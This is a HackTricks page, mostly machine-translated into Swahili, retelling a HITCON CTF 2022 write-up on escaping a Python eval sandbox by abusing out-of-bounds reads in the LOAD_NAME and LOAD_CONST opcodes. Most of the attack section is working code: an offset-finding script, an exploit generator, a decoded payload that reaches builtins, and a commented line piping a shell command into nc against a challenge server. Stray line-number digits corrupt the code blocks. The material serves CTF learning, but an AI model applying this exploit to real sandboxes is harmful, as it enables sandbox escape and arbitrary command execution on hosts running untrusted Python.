# LOAD\_NAME / LOAD\_CONST opcode OOB Read

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Hii taarifa ilichukuliwa** [**kutoka kwa andiko hili**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Tunaweza kutumia kipengele cha OOB read katika LOAD\_NAME / LOAD\_CONST opcode kupata alama fulani katika kumbukumbu. Hii inamaanisha kutumia hila kama `(a, b, c, ... mamia ya alama ..., __getattribute__) if [] else [].__getattribute__(...)` kupata alama (kama vile jina la kazi) unayotaka.

Kisha tengeneza tu exploit yako.

### Overview <a href="#overview-1" id="overview-1"></a>

Msimbo wa chanzo ni mfupi sana, unajumuisha mistari 4 tu!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
You can input arbitrary Python code, and it'll be compiled to a [Python code object](https://docs.python.org/3/c-api/code.html). However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.

Hivyo kwa njia hii, kila expression inayo na consts (mfano: nambari, nyuzi n.k.) au majina (mfano: mabadiliko, kazi) inaweza kusababisha segmentation fault mwishoni.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault inatokea vipi?

Tuanzie na mfano rahisi, `[a, b, c]` inaweza kukusanywa kuwa bytecode ifuatayo.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Lakini je, ni nini kitakachotokea ikiwa `co_names` itakuwa tuple tupu? Opcode `LOAD_NAME 2` bado inatekelezwa, na inajaribu kusoma thamani kutoka kwa anwani hiyo ya kumbukumbu ambayo awali ilipaswa kuwa. Ndio, hii ni "kipengele" cha kusoma nje ya mipaka.

Dhana kuu ya suluhisho ni rahisi. Opcode zingine katika CPython kama `LOAD_NAME` na `LOAD_CONST` zina udhaifu (?) kwa kusoma nje ya mipaka.

Zinapata kitu kutoka kwa index `oparg` kutoka kwa tuple ya `consts` au `names` (hivyo ndivyo `co_consts` na `co_names` zinavyoitwa kwa ndani). Tunaweza kurejelea kipande kifupi kuhusu `LOAD_CONST` ili kuona kile CPython inachofanya wakati inashughulikia opcode ya `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Kwa njia hii tunaweza kutumia kipengele cha OOB kupata "jina" kutoka kwa ofset ya kumbukumbu isiyo ya kawaida. Ili kuhakikisha ni jina gani lina, na ni ofset gani, endelea kujaribu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu katika takriban oparg > 700. Unaweza pia kujaribu kutumia gdb kuangalia mpangilio wa kumbukumbu bila shaka, lakini sidhani kama itakuwa rahisi zaidi?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Mara tu tunapopata hizo ofset muhimu za majina / consts, tuna _vipi_ kupata jina / const kutoka kwa ofset hiyo na kulitumia? Hapa kuna ujanja kwako:\
Tuchukulie tunaweza kupata jina la `__getattribute__` kutoka ofset 5 (`LOAD_NAME 5`) na `co_names=()`, kisha fanya mambo yafuatayo:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Kumbuka kwamba si lazima kuipa jina kama `__getattribute__`, unaweza kuipa jina la kifupi zaidi au la ajabu zaidi

Unaweza kuelewa sababu nyuma yake kwa kutazama bytecode yake:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Kumbuka kwamba `LOAD_ATTR` pia inapata jina kutoka `co_names`. Python inachukua majina kutoka kwa offset sawa ikiwa jina ni sawa, hivyo `__getattribute__` ya pili bado inachukuliwa kutoka offset=5. Kutumia kipengele hiki tunaweza kutumia jina lolote mara jina likiwa katika kumbukumbu karibu.

Kwa ajili ya kuzalisha nambari inapaswa kuwa rahisi:

* 0: si \[\[]]
* 1: si \[]
* 2: (si \[]) + (si \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Sikutumia consts kutokana na kikomo cha urefu.

Kwanza hapa kuna script ya kutusaidia kupata offsets hizo za majina.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Na yafuatayo ni kwa ajili ya kuzalisha exploit halisi ya Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Inafanya mambo yafuatayo, kwa ajili ya nyuzi hizo tunazipata kutoka kwa njia ya `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
